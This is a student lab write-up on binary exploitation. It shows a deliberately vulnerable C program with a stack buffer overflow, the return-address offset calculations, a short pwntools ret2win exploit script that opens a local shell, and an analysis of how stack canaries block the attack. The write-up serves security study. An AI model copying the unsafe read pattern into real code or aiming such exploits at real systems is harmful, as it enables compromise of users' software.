### Phase 4: Binary Exploitation I
This repository documents my work for Phase 4 of the Cyber Security Researcher track. It covers stack buffer overflow vulnerabilities, calculating return address offsets, binary mitigations (Stack Canaries), and redirection of execution flow (ret2win).

--------------------------------------------------------------------------------

#### Lab Exercises: Buffer Overflow & ret2win

##### Exercise 1: Base Control Flow Hijack (ret2win)
In this exercise, I analyzed a C program (`vuln.c`) containing a classic stack buffer overflow vulnerability to redirect execution to an uncalled `win()` function.

###### Vulnerability Analysis
The target function `vulnerable()` reads up to 256 bytes into a 64-byte stack buffer using `read(0, buffer, 256)`:
```c
void vulnerable(void) {
    char buffer[64];
    puts("Enter data:");
    read(0, buffer, 256);
    puts("Done.");
}
```
Because the input size exceeds the destination buffer, input past 64 bytes overflows into adjacent stack memory, allowing control over the saved frame pointer (RBP) and return address (RIP).

###### Offset Calculation
Using GDB and `pwndbg` pattern generation (`cyclic 120`), I determined the exact offset to the return address:
* **Buffer Size:** 64 bytes
* **Saved RBP:** 8 bytes
* **Total Offset to Return Address (RIP):** 72 bytes

* **Flag:** entrypoint{ret2win_success}

--------------------------------------------------------------------------------

##### Exercise 2: Buffer Resizing & Dynamic Offset
To verify how buffer size impacts stack layout and offsets, I updated `vuln.c` by expanding the local buffer to 128 bytes.

###### Source Code Modification
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win(void) {
    printf("Access granted. Flag: entrypoint{ret2win_success}\n");
    system("/bin/sh");
}

void vulnerable(void) {
    char buffer[128];
    puts("Enter data:");
    read(0, buffer, 256);
    puts("Done.");
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    vulnerable();
    return 0;
}
```

###### Offset Recalculation
* **New Buffer Size:** 128 bytes
* **Saved RBP:** 8 bytes
* **New Offset to Return Address:** 136 bytes

###### Exploit Script (`exploit.py`)
I wrote an exploit script using `pwntools` to automate payload generation and launch an interactive shell:
```python
from pwn import *

elf = context.binary = ELF("./vuln")

OFFSET = 136

payload = flat({OFFSET: elf.symbols["win"]})

io = process("./vuln")
io.recvuntil(b"Enter data:")
io.sendline(payload)
io.interactive()
```

###### Verification
Running `python3 exploit.py` successfully overwrote the return address at offset 136, executed `win()`, and granted an interactive shell (`/bin/sh`).

--------------------------------------------------------------------------------

##### Exercise 3: Mitigation Analysis – Stack Canary (`vuln_canary`)
In this exercise, I analyzed how compiler mitigations prevent buffer overflow attacks by enabling Stack Canaries.

###### Compilation
I compiled the vulnerable program without disabling stack protection:
```bash
gcc -g -O0 -no-pie -o vuln_canary vuln.c
```

###### Execution & Crash Analysis
Running `exploit.py` against `./vuln_canary` resulted in an immediate abort before the return address could be executed:
```text
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

###### Root Cause Analysis
1. **Canary Placement:** The compiler places a random 8-byte guard value (Canary) on the stack right before the saved RBP (`[rbp-8]`).
2. **Corruption:** Overflowing the buffer to reach the return address inevitably overwrites the Canary value.
3. **Detection:** Upon exiting `vulnerable()`, the function epilogue checks the stack Canary against its reference value. Since the value was corrupted, `__stack_chk_fail()` halts execution instantly, preventing control flow hijacking.
